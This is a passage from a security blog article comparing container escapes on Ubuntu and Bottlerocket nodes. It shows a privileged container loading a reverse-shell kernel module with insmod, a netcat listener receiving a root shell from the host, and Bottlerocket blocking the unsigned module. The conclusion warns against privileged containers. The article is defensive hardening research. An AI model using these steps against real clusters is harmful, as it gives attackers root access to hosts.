</span></code></pre></div>
<p>Beginning as usual with our Ubuntu-hosted container, we compile the code and run <code>insmod</code> to load it into the kernel:
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>root@app-priv-ubuntu:/lkm# make clean &amp;&amp; make
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>root@app-priv-ubuntu:/lkm# insmod k8s-lkm-reverse-shell.ko
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>root@app-priv-ubuntu:/lkm#
</span></code></pre></div></p>
<p>The module loads cleanly thanks to the <code>CAP_SYS_MODULE</code> capability, and the netcat listener on our waiting EC2 receives a callback ðŸ’€
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sh-5.2$ nc -lvnp 4444
</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>Ncat: Version 7.93 ( https://nmap.org/ncat )
</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>Ncat: Listening on :::4444
</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>Ncat: Listening on 0.0.0.0:4444
</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>Ncat: Connection from 51.26.193.49.
</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>Ncat: Connection from 51.26.193.49:25716.
</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>bash: cannot set terminal process group (-1): Inappropriate ioctl for device
</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>bash: no job control in this shell
</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>root@ip-10-248-4-218:/# whoami
</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>whoami
</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>root
</span></code></pre></div></p>
<p>With very little effort, we now have root-level access to the container's host. Trying to load the <code>k8s-lkm-reverse-shell.ko</code> in a container running on our Bottlerocket node, however, results in yet another brick wall:
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>root@app-priv-bottlerocket:/lkm# insmod k8s-lkm-reverse-shell.ko
</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>insmod: ERROR: could not insert module k8s-lkm-reverse-shell.ko: Operation not permitted
</span></code></pre></div></p>
<p>The culprit this time is Bottlerocket's <em>kernel integrity</em> mode, which prevents the loading of unsigned kernel modules and only permits those included in the Bottlerocket image. Interestingly, this feature was apparently disabled by default in earlier <a href="https://bottlerocket.dev/en/os/1.51.x/concepts/variants/">Bottlerocket variants</a>, but is now generally enabled by default, blocking yet another avenue of attack ðŸš€</p>
<h2 id="conclusion">Conclusion</h2>
<p>As pointed out at the beginning of this article, none of these container escape techniques are new, nor do they rely on any kind of CVE or exploit. All three are only possible when containers are deployed using a feature that countless resources point out should not be used - yet it still is. While Bottlerocket can block the types of attack demonstrated, that <em>shouldn't</em> be interpreted as an endorsement to use it in the hope of running privileged containers 'safely'. <em>The use of privileged containers should be avoided at all costs.</em></p>
<p>What it does show is that Bottlerocket has been designed with a defence-in-depth strategy, for which the developers should be commended. It both enhances security and at the same time minimises the attack surface. As a container host it provides a foundational pillar for building secure environments, that ideally implement both solid technical controls, and enforce sensible policies that govern how workloads can be deployed.</p>







  
  




  



      
    </article>
  </div>

          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
        
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../eks-hardening-blocking-pod-level-access-to-imds/" class="md-footer__link md-footer__link--prev" aria-label="Previous: EKS Hardening: Blocking Pod-Level Access to IMDS">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                EKS Hardening: Blocking Pod-Level Access to IMDS
              </div>
            </div>
          </a>
        
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://www.linkedin.com/in/terryf82/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tracking", "navigation.expand", "navigation.footer"], "search": "../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>